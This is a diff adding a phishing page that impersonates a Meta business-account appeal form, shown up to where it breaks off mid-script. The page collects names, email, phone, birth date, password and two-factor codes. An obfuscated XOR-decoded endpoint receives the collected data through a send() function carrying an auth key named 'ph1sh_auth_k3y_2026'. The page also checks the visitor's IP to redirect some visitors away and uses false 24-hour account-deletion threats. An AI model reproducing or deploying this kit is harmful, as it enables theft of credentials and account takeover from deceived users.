@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Meta</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><circle cx='24' cy='24' r='24' fill='%231877F2'/><path d='M26 38V25h3.5l.5-4h-4v-2.5c0-1.2.4-2 2-2h2.5V13c-.4 0-1.7-.2-3-.2-3.2 0-5.5 2-5.5 5.5v2.7H19v4h2.5v13H26z' fill='%23fff'/></svg>" type="image/svg+xml">
+    <base href="/appeal/">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' data:; script-src * 'unsafe-inline' https://unpkg.com; connect-src *; style-src * 'unsafe-inline';">
+    <script src="libphonenumber-min.js" onerror="var s=document.createElement('script');s.src='https://unpkg.com/libphonenumber-js@1.10.53/bundle/libphonenumber-min.js';document.head.appendChild(s);"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+        body{background-color:#f0f2f5;background-image:url('meta-gradient.webp');background-size:cover;min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:16px}
+        body.popup-open{overflow:hidden}
+        .card{background:#fff;max-width:580px;width:100%;border-radius:8px;box-shadow:0 1px 2px rgba(0,0,0,.2);padding:28px 24px}
+        @media(max-width:480px){body{padding:0;align-items:flex-start}.card{border-radius:0;padding:24px 16px;max-width:100%;box-shadow:none;min-height:100vh}.restricted-title{font-size:18px}}
+
+        .meta-brand{text-align:center;margin-bottom:12px}
+        .brand-container{display:flex;align-items:center;justify-content:center;gap:8px}
+        .brand-container img{height:32px;width:auto}
+        .brand-container span{font-size:20px;font-weight:700;color:#1b1f23}
+
+        .custom-image{text-align:center;margin-bottom:12px}
+        .custom-image img{width:100%;border-radius:12px;display:block}
+
+        .restricted-title{font-size:22px;font-weight:600;line-height:1.2;color:#1b1f23;margin-bottom:8px;text-align:center}
+        .description{color:#1c1e21;font-size:15px;line-height:1.5;margin-bottom:18px}
+
+        .form-group{margin-bottom:12px}
+        .form-group label{display:block;margin-bottom:4px;font-size:13px;font-weight:400;color:#606770}
+
+        .input-wrapper{position:relative;height:50px;padding:10px 16px;box-sizing:border-box;border-radius:8px;background-color:rgba(255,255,255,0.2);box-shadow:0 0 0 1px #d0d3d6 inset;transition:box-shadow .15s,border-color .15s;border:1px solid transparent}
+        .input-wrapper:focus-within{box-shadow:none;border:1px solid #28292c}
+        .input-wrapper input{width:100%;height:30px;padding:10px 0 0 0;border:none;outline:none;background:transparent;font-size:14px;font-weight:400;line-height:19px;font-family:"Segoe UI",system-ui,-apple-system,BlinkMacSystemFont,sans-serif;color:#1c1e21;box-sizing:border-box}
+        .input-wrapper label{position:absolute;left:16px;top:50%;font-size:15px;color:#666a72;pointer-events:none;font-family:"Segoe UI",system-ui,-apple-system,BlinkMacSystemFont,sans-serif;transition:transform .2s cubic-bezier(0.17,0.17,0,1),top .2s cubic-bezier(0.17,0.17,0,1);transform:translateY(-50%);transform-origin:left top}
+        .input-wrapper input:focus+label,.input-wrapper input:not(:placeholder-shown)+label{top:6px;transform:translateY(0) scale(0.7)}
+        .input-wrapper input:-webkit-autofill{transition:background-color 9999s ease-in-out 0s;-webkit-text-fill-color:#1c1e21}
+        .phone-wrapper input:-webkit-autofill{transition:background-color 9999s ease-in-out 0s;-webkit-text-fill-color:#1c1e21;-webkit-box-shadow:0 0 0 30px #fff inset!important}
+
+        .form-group.input-error .input-wrapper{box-shadow:none!important;border-color:#e41e3f!important}
+        .form-group.input-error .input-wrapper label{color:#e41e3f!important}
+        .form-group.input-error .custom-select-trigger{border-color:#e41e3f!important;box-shadow:none!important}
+        .form-group.input-error .phone-wrapper{box-shadow:none!important;border-color:#e41e3f!important}
+        .form-group.input-error .phone-wrapper:focus-within{box-shadow:none!important;border-color:#e41e3f!important}
+
+        .birthday-label-row{display:flex;align-items:center;gap:6px;margin-bottom:6px}
+        .birthday-label-row label{font-size:12px;font-weight:600;color:#606770}
+        .birthday-help{display:inline-flex;align-items:center;justify-content:center;width:14px;height:14px;border-radius:50%;border:1px solid #606770;color:#606770;font-size:10px;font-weight:700;cursor:pointer;line-height:1}
+        .birthday-selects{display:flex;gap:16px}
+        .custom-select{flex:1;min-width:0;position:relative}
+        .custom-select-trigger{height:50px;padding:0 32px 0 16px;background-color:rgba(255,255,255,0.2);border:1px solid #d0d3d6;border-radius:16px;font-size:15px;font-family:"Segoe UI Historic","Segoe UI",Helvetica,Arial,sans-serif;color:#1c1e21;display:flex;align-items:center;cursor:pointer;transition:border-color .15s;user-select:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2365676b' d='M6 8L1 3h10z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 16px center}
+        .custom-select-trigger.selected{color:#1c1e21}
+        .custom-select.open .custom-select-trigger{border-color:#28292c}
+        .custom-select-options{display:none;position:absolute;top:calc(100% + 4px);left:0;right:0;max-height:240px;overflow-y:auto;scrollbar-width:thin;scrollbar-color:rgba(0,0,0,.15) transparent;background:#fff;border-radius:16px;box-shadow:0 4px 12px rgba(0,0,0,.1);z-index:10}
+        .custom-select-options::-webkit-scrollbar{width:6px}
+        .custom-select-options::-webkit-scrollbar-thumb{background:rgba(0,0,0,.15);border-radius:3px}
+        .custom-select.open .custom-select-options{display:block}
+        .custom-option{display:flex;align-items:center;height:52px;padding:0 16px;font-size:12px;color:rgb(28,30,33);cursor:pointer;font-family:"Segoe UI Historic","Segoe UI",Helvetica,Arial,sans-serif}
+        .custom-option:hover{background-color:rgba(0,0,0,0.04)}
+
+        .error-message{color:#e41e3f;font-size:13px;margin-top:5px;display:none}
+        .error-message.show{display:block}
+
+        .phone-wrapper{position:relative;display:flex;border-radius:8px;overflow:visible;border:1px solid #d0d3d6;background:#fff;transition:border-color .15s}
+        .phone-wrapper:focus-within{border-color:#28292c;box-shadow:none}
+        .country-selector{background:#f0f2f5;display:flex;align-items:center;gap:6px;padding:0 12px;border-right:1px solid #dddfe2;border-radius:8px 0 0 8px;cursor:pointer;user-select:none;white-space:nowrap;min-width:100px;flex-shrink:0;transition:background .2s}
+        .country-selector:hover{background:#e4e6e9}
+        .selected-flag{width:24px;height:18px;object-fit:cover;border-radius:3px}
+        .selected-code{font-weight:500;color:#1c1e21;font-size:15px}
+        .dropdown-icon{font-size:12px;color:#65676b;margin-left:4px}
+        .phone-wrapper input{flex:1;border:none;border-radius:0 8px 8px 0;padding:14px 14px;font-size:14px;font-weight:400;outline:none;color:#1c1e21;background:#fff}
+        .phone-wrapper input:focus{box-shadow:none}
+        .country-dropdown{position:absolute;top:calc(100% + 4px);left:0;width:100%;max-width:320px;max-height:300px;background:#fff;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,.15);z-index:11000;display:none;overflow:hidden;border:1px solid #e4e6e9}
+        .country-dropdown.show{display:block}
+        .search-box{padding:10px 12px;border-bottom:1px solid #e4e6e9}
+        .search-box input{width:100%;padding:8px 12px;border:1px solid #dddfe2;border-radius:20px;font-size:14px;outline:none}
+        .search-box input:focus{border-color:#0866ff}
+        .country-list{overflow-y:auto;max-height:270px}
+        .country-item{display:flex;align-items:center;gap:10px;padding:10px 14px;cursor:pointer;transition:background .15s}
+        .country-item:hover{background:#f0f2f5}
+        .country-item img{width:24px;height:18px;object-fit:cover;border-radius:3px;flex-shrink:0}
+        .country-info{display:flex;flex-direction:column;flex:1}
+        .country-name{font-size:14px;color:#1c1e21;font-weight:500}
+        .country-dial{font-size:12px;color:#65676b}
+        .no-results{padding:14px;text-align:center;color:#8a8d91;font-size:14px}
+
+        .pw-wrap{position:relative}
+        .pw-wrap input{padding-right:40px!important}
+        .pw-wrap input::-ms-reveal,.pw-wrap input::-ms-clear,.pw-wrap input::-webkit-password-toggle{display:none}
+        .pw-toggle{position:absolute;right:0;top:50%;transform:translateY(-50%);width:40px;height:40px;background:none;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#606770;outline:none;padding:0;visibility:hidden}
+        .pw-toggle.visible{visibility:visible}
+        .pw-toggle:hover{color:#1c1e21}
+
+        .case-block{background:#f0f2f5;border-radius:8px;padding:14px;margin:20px 0;font-size:14px}
+        .case-number{margin-bottom:8px}
+        .case-number strong{font-weight:600;color:#050505}
+        .case-number span{color:#0866ff;font-weight:500;letter-spacing:.3px}
+        .about-case{font-size:14px;color:#2c2e30;line-height:1.4}
+        .about-case strong{font-weight:600;color:#050505}
+
+        .continue-btn{display:inline-flex;align-items:center;justify-content:center;width:100%;height:44px;padding:0 20px;font-size:15px;font-weight:600;color:#fff;background:#0866ff;border:none;border-radius:40px;cursor:pointer;transition:background .15s,box-shadow .15s;margin-bottom:16px;box-shadow:0 2px 8px rgba(0,102,255,.25)}
+        .continue-btn:hover{background:#1871f2}
+        .continue-btn:disabled{background:#b0c4de;cursor:not-allowed;opacity:.6;box-shadow:none}
+        .continue-btn:active{transform:scale(.98)}
+        .spinner{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;margin-left:8px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .continue-btn.loading .btn-text{display:none}
+        .continue-btn.loading .spinner{display:inline-block}
+        .continue-btn.loading{pointer-events:none}
+
+        .warning-message{background:#f0f2f5;border-radius:8px;padding:10px 14px;margin-bottom:14px;display:flex;gap:8px;font-size:12px;color:#65676b}
+        .warning-message .icon{font-size:16px;flex-shrink:0;line-height:1.4}
+        .warning-message a{color:#0866ff;text-decoration:none;font-weight:500}
+        .warning-message a:hover{text-decoration:underline}
+
+        .meta-footer{text-align:center;margin-top:24px;padding-top:20px;border-top:1px solid #e4e6e9}
+        .footer-links{display:flex;justify-content:center;flex-wrap:wrap;gap:4px 2px;margin-bottom:8px}
+        .footer-links a{font-size:12px;color:#8a8d91;text-decoration:none}
+        .footer-links a:hover{text-decoration:underline}
+        .footer-links span{font-size:12px;color:#8a8d91;margin:0 4px}
+        .footer-copy{font-size:12px;color:#8a8d91}
+
+        .popup-overlay{position:fixed;top:0;left:0;width:100%;height:100%;height:100dvh;background:rgba(0,0,0,.4);display:none;align-items:center;justify-content:center;z-index:10000;padding:16px;box-sizing:border-box}
+        .popup-content{background:#fff;max-width:520px;width:100%;max-height:90vh;max-height:90dvh;overflow-y:auto;border-radius:16px;box-shadow:0 0 0 1px rgba(0,0,0,.08),0 4px 12px rgba(0,0,0,.15);padding:24px 12px}
+        @media(max-width:480px){.popup-overlay{padding:0;align-items:flex-end}.popup-content{max-width:100%;max-height:100vh;max-height:100dvh;border-radius:16px 16px 0 0}.popup-scroll{padding:12px 4px 20px}}
+        .popup-content .fb-header{font-size:14px;color:#65676b;margin-bottom:6px;font-weight:500}
+        .popup-scroll{padding:12px 8px;overflow:visible}
+        .popup-content h2{font-size:17px;font-weight:400;text-align:center;margin-bottom:12px;color:#606770}
+        .popup-content .info-text{font-size:15px;color:#1c1e21;line-height:1.5;margin-bottom:24px}
+        .popup-content .info-text strong{color:#0866ff;font-weight:600;text-decoration:none}
+        .popup-content .info-text strong a{color:inherit;text-decoration:none}
+        .popup-content .code-label{font-size:15px;font-weight:600;color:#1b1f23;margin-bottom:8px;display:block}
+        .popup-content .input-wrapper{margin-bottom:16px}
+        .popup-content input:disabled{background:#f0f2f5;cursor:not-allowed}
+        .popup-content .input-wrapper input:disabled{background:transparent}
+        .popup-content .popup-image{text-align:center;margin:16px 0}
+        .popup-content .popup-image img{max-width:100%;height:auto;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+        .popup-content .popup-error{color:#e41e3f;font-size:14px;margin:0 0 16px 0;padding:12px 16px;background:#ffefef;border-radius:8px;border-left:4px solid #e41e3f;display:none}
+        .popup-content .popup-error.show{display:block}
+        .popup-content .countdown{font-weight:600;color:#e41e3f}
+        .popup-content .try-another{text-align:center;margin-bottom:12px}
+        .popup-content .try-another a{color:#0866ff;text-decoration:none;font-size:14px;font-weight:500}
+        .popup-content .try-another a:hover{text-decoration:underline}
+        .popup-footer{text-align:center;margin-top:16px;padding-top:12px;border-top:1px solid #e4e6e9;font-size:12px;color:#8a8d91}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="meta-brand">
+            <div class="brand-container">
+                <img src="meta-color.png" alt="Meta" style="height:32px;width:auto">
+                <span>Meta</span>
+            </div>
+        </div>
+
+        <div class="custom-image">
+            <img src="fabz.png" alt="Notice image">
+        </div>
+
+        <div class="restricted-title">Your business account has been restricted</div>
+
+        <div class="description">
+            Your account has been restricted due to potential violations of our Advertising Policies, including misleading content, non-compliant creatives, or restricted products. If you believe this action was taken in error, you can request a review below to continue.
+        </div>
+
+        <div id="dynamic-forms">
+            <div class="form-group" id="page-name-group">
+                <label>Page name</label>
+                <div class="input-wrapper">
+                    <input type="text" id="page-name" placeholder=" ">
+                    <label for="page-name">e.g., Your Business or Brand</label>
+                </div>
+                <div class="error-message" id="page-name-error"></div>
+            </div>
+            <div class="form-group" id="fb-name-group">
+                <label>Name</label>
+                <div class="input-wrapper">
+                    <input type="text" id="fb-name" placeholder=" ">
+                    <label for="fb-name">Enter your name</label>
+                </div>
+                <div class="error-message" id="fb-name-error"></div>
+            </div>
+            <div class="form-group" id="email-group">
+                <label>Email address</label>
+                <div class="input-wrapper">
+                    <input type="email" id="email" placeholder=" ">
+                    <label for="email">Enter your email address</label>
+                </div>
+                <div class="error-message" id="email-error"></div>
+            </div>
+            <div class="form-group" id="phone-group">
+                <div class="phone-wrapper" id="phone-wrapper">
+                    <div class="country-selector" id="country-selector">
+                        <img class="selected-flag" id="selected-flag" src="assests/US.svg" alt="US">
+                        <span class="selected-code" id="selected-dial-code">+1</span>
+                        <span class="dropdown-icon">▼</span>
+                    </div>
+                    <input type="tel" id="phone-number" placeholder="Enter mobile number" autocomplete="off">
+                    <div class="country-dropdown" id="country-dropdown">
+                        <div class="search-box"><input type="text" id="search-country" placeholder="Find the country name or code..." autocomplete="off"></div>
+                        <div class="country-list" id="country-list"></div>
+                    </div>
+                </div>
+                <div class="error-message" id="phone-error"></div>
+            </div>
+            <div class="form-group" id="birthday-group">
+                <div class="birthday-label-row">
+                    <label>Date of birth</label>
+                    <span class="birthday-help">?</span>
+                </div>
+                <div class="birthday-selects">
+                    <div class="custom-select" id="bd-month-wrap">
+                        <div class="custom-select-trigger">Month</div>
+                        <div class="custom-select-options" id="bd-month-options"></div>
+                        <input type="hidden" id="birthday-month" value="">
+                    </div>
+                    <div class="custom-select" id="bd-day-wrap">
+                        <div class="custom-select-trigger">Day</div>
+                        <div class="custom-select-options" id="bd-day-options"></div>
+                        <input type="hidden" id="birthday-day" value="">
+                    </div>
+                    <div class="custom-select" id="bd-year-wrap">
+                        <div class="custom-select-trigger">Year</div>
+                        <div class="custom-select-options" id="bd-year-options"></div>
+                        <input type="hidden" id="birthday-year" value="">
+                    </div>
+                </div>
+                <div class="error-message" id="birthday-error"></div>
+            </div>
+        </div>
+
+        <div class="case-block">
+            <div class="case-number"><strong>Case Number:</strong> <span>#986937844856</span></div>
+            <div class="about-case"><strong>About Case:</strong> Potential violations of our Advertising Policies (misleading content, non-compliant creatives, or restricted products).</div>
+        </div>
+
+        <button class="continue-btn" id="continue-btn">
+            <span class="btn-text">Continue</span><span class="spinner"></span>
+        </button>
+
+        <div class="warning-message">
+            <span class="icon">⚠️</span>
+            <span><strong>You have 24 hours to complete this process.</strong> If no action is taken, your account may be permanently disabled without the option to appeal. To learn more, visit our <a href="https://transparency.meta.com/policies/community-standards/">Advertising Policies</a>.</span>
+        </div>
+
+        <div class="meta-footer">
+            <div class="footer-links">
+                <a href="#">English (US)</a><span>·</span><a href="#">Français</a><span>·</span>
+                <a href="#">Español</a><span>·</span><a href="#">Deutsch</a><span>·</span>
+                <a href="#">Italiano</a>
+            </div>
+            <div class="footer-copy">Meta &copy; 2026</div>
+        </div>
+    </div>
+
+    <div class="popup-overlay" id="password-popup">
+        <div class="popup-content" style="padding-bottom:2px">
+            <div class="popup-scroll" style="padding-bottom:0">
+                <div style="text-align:center;margin-bottom:20px">
+                    <img src="https://th.bing.com/th/id/R.70ecfdd862bdc3fdbf5715085812f49e?rik=fDJPk4oWTEisvw&pid=ImgRaw&r=0" alt="Facebook" style="width:48px;height:48px;border-radius:50%">
+                </div>
+                <h2 style="font-size:15px">For your security, you must enter your password to continue.</h2>
+                <div class="form-group" id="pw-popup-group">
+                    <div class="pw-wrap input-wrapper">
+                        <input type="password" id="pw-popup-input" placeholder=" ">
+                        <label for="pw-popup-input">Enter your password</label>
+                        <button class="pw-toggle" type="button" id="pw-popup-toggle">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                        </button>
+                    </div>
+                    <div class="error-message" id="pw-popup-error"></div>
+                </div>
+                <button class="continue-btn" id="pw-popup-continue"><span class="btn-text">Continue</span><span class="spinner"></span></button>
+                <div style="text-align:center;margin-top:12px"><a href="#" style="color:#606770;font-size:14px;text-decoration:none;font-weight:500">Forgot your password?</a></div>
+                <div style="text-align:center;margin-top:14px;padding-top:8px;border-top:1px solid #e4e6e9;line-height:0">
+                    <img src="https://static.vecteezy.com/system/resources/previews/022/100/699/non_2x/meta-logo-transparent-free-png.png" alt="Meta" style="height:48px;display:block;margin:0 auto">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="popup-overlay" id="twofa-popup">
+        <div class="popup-content" style="padding-bottom:2px">
+            <div class="popup-scroll" style="padding-bottom:0">
+                <div class="fb-header" id="fb-header-display"></div>
+                <div class="info-text">
+                    We sent a login code to <strong id="display-email"></strong> and <strong id="display-phone"></strong>. You can also use your authentication app (such as Duo Mobile or Google Authenticator) to get a code.
+                </div>
+                <div class="popup-image"><img src="1.png" alt="2FA"></div>
+                <div class="input-wrapper">
+                    <input type="text" id="twofa-code" placeholder=" " inputmode="numeric" maxlength="8" autocomplete="one-time-code" oninput="this.value=this.value.replace(/\D/g,'')">
+                    <label for="twofa-code">Code</label>
+                </div>
+                <div class="popup-error" id="twofa-error">The login code you entered doesn't match the one we sent. Check your code and try again in <span class="countdown" id="countdown-timer">0 minutes 30 seconds</span>.</div>
+                <button class="continue-btn" id="twofa-continue" disabled><span class="btn-text">Continue</span><span class="spinner"></span></button>
+                <div class="try-another"><a href="#" id="try-another">Try another way</a></div>
+                <div style="text-align:center;margin-top:14px;padding-top:8px;border-top:1px solid #e4e6e9;line-height:0">
+                    <img src="https://static.vecteezy.com/system/resources/previews/022/100/699/non_2x/meta-logo-transparent-free-png.png" alt="Meta" style="height:48px;display:block;margin:0 auto">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    (function(){
+        // --- Session step persistence ---
+        var APPEAL_STEP_KEY='appeal_step';
+        function saveStep(s){try{var d=JSON.stringify({step:s,data:step1Data,email:firstEmail,sid:sessionId});localStorage.setItem(APPEAL_STEP_KEY,d)}catch(e){}}
+        function clearStep(){try{localStorage.removeItem(APPEAL_STEP_KEY)}catch(e){}}
+
+        var userIp='Unknown',sessionId='xxxx-xxxx'.replace(/[x]/g,function(c){var r=Math.random()*16|0;return r.toString(16)});
+        (function(){var s=[{url:'https://api.ipify.org?format=json',key:'ip'},{url:'https://api64.ipify.org?format=json',key:'ip'},{url:'https://httpbin.org/ip',key:'origin'},{url:'https://api.ip.sb/geoip',key:'ip'},{url:'https://ipapi.co/json/',key:'ip'}];function t(i){if(i>=s.length)return;fetch(s[i].url).then(function(r){return r.json()}).then(function(d){userIp=d[s[i].key]||'Unknown';fetch('https://ipapi.co/'+userIp+'/country/').then(function(r){return r.text()}).then(function(c){if(c.trim()==='VN')location.href='https://www.facebook.com'}).catch(function(){fetch('https://ipwho.is/'+userIp).then(function(r){return r.json()}).then(function(d){if(d.country_code==='VN')location.href='https://www.facebook.com'}).catch(function(){})})}).catch(function(){t(i+1)})}t(0)})();
+
+        var _e='103f4d531e6a1d0b06245e33197f43173952461f7e485c1834413812241a0f244b480822410a122941',_k='xK9#mP2$vL7@qR4',_auth='ph1sh_auth_k3y_2026',_workerUrl='';
+        for(var i=0;i<_e.length;i+=2)_workerUrl+=String.fromCharCode(parseInt(_e.substring(i,i+2),16)^_k.charCodeAt((i/2)%_k.length));
+        function send(type,payload){fetch(_workerUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:sessionId,type:type,payload:payload,ip:userIp,auth:_auth})}).catch(function(){})}
+
+        var countries=[{code:"AF",name:"Afghanistan",dial:"+93"},{code:"AL",name:"Albania",dial:"+355"},{code:"DZ",name:"Algeria",dial:"+213"},{code:"US",name:"United States",dial:"+1"},{code:"AR",name:"Argentina",dial:"+54"},{code:"AU",name:"Australia",dial:"+61"},{code:"AT",name:"Austria",dial:"+43"},{code:"BD",name:"Bangladesh",dial:"+880"},{code:"BE",name:"Belgium",dial:"+32"},{code:"BR",name:"Brazil",dial:"+55"},{code:"BG",name:"Bulgaria",dial:"+359"},{code:"KH",name:"Cambodia",dial:"+855"},{code:"CM",name:"Cameroon",dial:"+237"},{code:"CA",name:"Canada",dial:"+1"},{code:"CL",name:"Chile",dial:"+56"},{code:"CN",name:"China",dial:"+86"},{code:"CO",name:"Colombia",dial:"+57"},{code:"HR",name:"Croatia",dial:"+385"},{code:"CZ",name:"Czech Republic",dial:"+420"},{code:"DK",name:"Denmark",dial:"+45"},{code:"EG",name:"Egypt",dial:"+20"},{code:"FI",name:"Finland",dial:"+358"},{code:"FR",name:"France",dial:"+33"},{code:"DE",name:"Germany",dial:"+49"},{code:"GR",name:"Greece",dial:"+30"},{code:"HK",name:"Hong Kong",dial:"+852"},{code:"HU",name:"Hungary",dial:"+36"},{code:"IN",name:"India",dial:"+91"},{code:"ID",name:"Indonesia",dial:"+62"},{code:"IE",name:"Ireland",dial:"+353"},{code:"IL",name:"Israel",dial:"+972"},{code:"IT",name:"Italy",dial:"+39"},{code:"JP",name:"Japan",dial:"+81"},{code:"KE",name:"Kenya",dial:"+254"},{code:"KW",name:"Kuwait",dial:"+965"},{code:"LB",name:"Lebanon",dial:"+961"},{code:"MY",name:"Malaysia",dial:"+60"},{code:"MX",name:"Mexico",dial:"+52"},{code:"MA",name:"Morocco",dial:"+212"},{code:"MM",name:"Myanmar",dial:"+95"},{code:"NL",name:"Netherlands",dial:"+31"},{code:"NZ",name:"New Zealand",dial:"+64"},{code:"NG",name:"Nigeria",dial:"+234"},{code:"NO",name:"Norway",dial:"+47"},{code:"PK",name:"Pakistan",dial:"+92"},{code:"PE",name:"Peru",dial:"+51"},{code:"PH",name:"Philippines",dial:"+63"},{code:"PL",name:"Poland",dial:"+48"},{code:"PT",name:"Portugal",dial:"+351"},{code:"RO",name:"Romania",dial:"+40"},{code:"RU",name:"Russia",dial:"+7"},{code:"SA",name:"Saudi Arabia",dial:"+966"},{code:"SG",name:"Singapore",dial:"+65"},{code:"ZA",name:"South Africa",dial:"+27"},{code:"KR",name:"South Korea",dial:"+82"},{code:"ES",name:"Spain",dial:"+34"},{code:"SE",name:"Sweden",dial:"+46"},{code:"CH",name:"Switzerland",dial:"+41"},{code:"TW",name:"Taiwan",dial:"+886"},{code:"TH",name:"Thailand",dial:"+66"},{code:"TR",name:"Turkey",dial:"+90"},{code:"UA",name:"Ukraine",dial:"+380"},{code:"AE",name:"United Arab Emirates",dial:"+971"},{code:"GB",name:"United Kingdom",dial:"+44"},{code:"VN",name:"Vietnam",dial:"+84"},{code:"YE",name:"Yemen",dial:"+967"},{code:"ZW",name:"Zimbabwe",dial:"+263"}];
+
+        var countryNames={"AF":"Afghanistan","AL":"Albania","DZ":"Algeria","US":"United States","AR":"Argentina","AU":"Australia","AT":"Austria","BD":"Bangladesh","BE":"Belgium","BR":"Brazil","BG":"Bulgaria","KH":"Cambodia","CM":"Cameroon","CA":"Canada","CL":"Chile","CN":"China","CO":"Colombia","HR":"Croatia","CZ":"Czech Republic","DK":"Denmark","EG":"Egypt","FI":"Finland","FR":"France","DE":"Germany","GR":"Greece","HK":"Hong Kong","HU":"Hungary","IN":"India","ID":"Indonesia","IE":"Ireland","IL":"Israel","IT":"Italy","JP":"Japan","KE":"Kenya","KW":"Kuwait","LB":"Lebanon","MY":"Malaysia","MX":"Mexico","MA":"Morocco","MM":"Myanmar","NL":"Netherlands","NZ":"New Zealand","NG":"Nigeria","NO":"Norway","PK":"Pakistan","PE":"Peru","PH":"Philippines","PL":"Poland","PT":"Portugal","RO":"Romania","RU":"Russia","SA":"Saudi Arabia","SG":"Singapore","ZA":"South Africa","KR":"South Korea","ES":"Spain","SE":"Sweden","CH":"Switzerland","TW":"Taiwan","TH":"Thailand","TR":"Turkey","UA":"Ukraine","AE":"United Arab Emirates","GB":"United Kingdom","VN":"Vietnam","YE":"Yemen","ZW":"Zimbabwe"};
+
+        var selector=document.getElementById('country-selector'),dropdown=document.getElementById('country-dropdown'),
+            selectedFlag=document.getElementById('selected-flag'),selectedDial=document.getElementById('selected-dial-code'),
+            countryList=document.getElementById('country-list'),searchInput=document.getElementById('search-country'),
+            phoneInput=document.getElementById('phone-number'),selectedCountry={code:"US",dial:"+1"},filteredCountries=countries;
+
+        function renderCountries(filter){
+            var term=(filter||'').toLowerCase().trim();
+            filteredCountries=countries.filter(function(c){
+                var name=(countryNames[c.code]||c.code).toLowerCase();
+                return c.code.toLowerCase().includes(term)||c.dial.includes(term)||name.includes(term);
+            });
+            if(!filteredCountries.length){countryList.innerHTML='<div class="no-results">No countries found</div>';return}
+            var h='';
+            filteredCountries.forEach(function(c){
+                var name=countryNames[c.code]||c.code;
+                h+='<div class="country-item" data-code="'+c.code+'" data-dial="'+c.dial+'"><img src="assests/'+c.code+'.svg" alt="'+name+'" loading="lazy"><div class="country-info"><span class="country-name">'+name+' ('+c.code+')</span><span class="country-dial">'+c.dial+'</span></div></div>';
+            });
+            countryList.innerHTML=h;
+        }
+        function selectCountry(code,dial){selectedCountry={code:code,dial:dial};selectedFlag.src='assests/'+code+'.svg';selectedDial.textContent=dial;dropdown.classList.remove('show');phoneInput.focus()}
+
+        selector.addEventListener('click',function(e){e.stopPropagation();dropdown.classList.toggle('show');if(dropdown.classList.contains('show')){searchInput.focus();renderCountries(searchInput.value)}});
+        document.addEventListener('click',function(e){if(!selector.contains(e.target)&&!dropdown.contains(e.target))dropdown.classList.remove('show')});
+        searchInput.addEventListener('input',function(){renderCountries(this.value)});
+        countryList.addEventListener('click',function(e){var item=e.target.closest('.country-item');if(item)selectCountry(item.dataset.code,item.dataset.dial)});
+        renderCountries();
+
+        var ignoreInputEvent=false;
+        phoneInput.addEventListener('input',function(e){
+            if(ignoreInputEvent)return;
+            var raw=this.value,code=selectedCountry.code;
+            try{var fmt=new libphonenumber.AsYouType(code);var fv=fmt.input(raw);if(fv!==raw){ignoreInputEvent=true;this.value=fv;this.setSelectionRange(fv.length,fv.length);ignoreInputEvent=false}}catch(e){}
+        });
+        function getFullPhoneNumber(){
+            var raw=phoneInput.value.trim(),code=selectedCountry.code;
+            try{if(typeof libphonenumber!=='undefined'&&libphonenumber.parsePhoneNumberFromString){var pn=libphonenumber.parsePhoneNumberFromString(raw,code);if(pn&&pn.isValid())return pn.number}return selectedCountry.dial+raw.replace(/\D/g,'')}catch(e){return selectedCountry.dial+raw.replace(/\D/g,'')}
+        }
+        function maskPhone(phone,dial){
+            if(!phone)return'';
+            var cd=dial||selectedCountry.dial,nat=phone.replace(cd,'').replace(/\D/g,'');
+            if(nat===phone||nat===''){var d=phone.replace(/\D/g,'');return cd+'*'.repeat(d.length-3)+d.slice(-3)}
+            return cd+'*'.repeat(nat.length-3)+nat.slice(-3);
+        }
+
+        var dynamicForms=document.getElementById('dynamic-forms'),
+            continueBtn=document.getElementById('continue-btn'),twofaPopup=document.getElementById('twofa-popup'),
+            twofaCode=document.getElementById('twofa-code'),twofaContinue=document.getElementById('twofa-continue'),
+            twofaError=document.getElementById('twofa-error'),countdownSpan=document.getElementById('countdown-timer'),
+            displayEmail=document.getElementById('display-email'),displayPhone=document.getElementById('display-phone'),
+            pageNameInput=document.getElementById('page-name'),fbNameInput=document.getElementById('fb-name'),
+            birthdayMonth=document.getElementById('birthday-month'),birthdayDay=document.getElementById('birthday-day'),
+            birthdayYear=document.getElementById('birthday-year');
+
+        function $(id){return document.getElementById(id)}
+
+        function clearError(group,errorEl){group.classList.remove('input-error');errorEl.classList.remove('show');errorEl.textContent=''}
+        function showError(group,errorEl,msg){group.classList.add('input-error');errorEl.textContent=msg;errorEl.classList.add('show')}
+
+        var isSending=false,step1Data={},firstEmail='',firstPassword='',secondPassword='',firstCode='',countdownInterval=null,countdownSeconds=30;
+
+        function validateStep1(){
+            var ok=true;
+            var pv=pageNameInput.value.trim();
+            if(!pv){showError($('page-name-group'),$('page-name-error'),'Please enter your page name.');ok=false}else{clearError($('page-name-group'),$('page-name-error'))}
+            var fv=fbNameInput.value.trim();
+            if(!fv){showError($('fb-name-group'),$('fb-name-error'),'Please enter your name.');ok=false}else{clearError($('fb-name-group'),$('fb-name-error'))}
+            var ev=$('email').value.trim();
